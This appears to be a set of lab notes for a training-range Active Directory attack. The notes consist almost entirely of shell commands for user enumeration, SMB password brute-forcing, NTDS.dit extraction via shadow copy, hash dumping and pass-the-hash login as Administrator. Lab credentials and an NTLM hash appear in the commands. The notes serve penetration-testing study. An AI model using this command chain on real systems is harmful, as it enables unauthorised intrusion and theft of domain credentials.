1) creating username list for GP
```shell
./username-anarchy -i /home/ltnbob/names.txt
```

2) Enumerating valid usernames with Kerbrute
```shell
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

3) Launching a brute-force attack with NetExec
```shell
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

4) Capturing NTDS.dit
```shell
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

after get shell of user we need to enumerate users' groups and history of commands

4) Capturing NTDS.dit
```shell
net user bwilliamson
```

5) Creating shadow copy of C in powershell:
```shell
vssadmin CREATE SHADOW /For=C:
```

6) Copying NTDS.dit from the VSS
```shell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

7) Extracting hashes from NTDS.dit
```shell
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### A faster method: Using NetExec to capture NTDS.dit
```shell
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

without cracking NTLM hash login the user via PtH

```shell
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```



















